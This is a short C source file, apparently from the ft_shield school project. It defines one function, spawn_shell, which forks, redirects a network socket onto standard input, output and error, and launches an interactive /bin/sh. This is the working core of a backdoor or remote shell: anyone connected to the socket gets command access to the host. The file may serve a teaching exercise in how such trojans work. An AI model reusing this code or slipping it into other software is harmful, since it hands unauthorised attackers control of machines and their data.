#include "ft_shield.h"

void	spawn_shell(int fd)
{
	pid_t	pid;

	pid = fork();
	if (pid < 0)
	{
		close(fd);
		return ;
	}
	if (pid == 0)
	{
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		if (fd > STDERR_FILENO)
			close(fd);
		execve("/bin/sh", (char *[]){"sh", "-i", NULL}, environ);
		_exit(1);
	}
	close(fd);
}
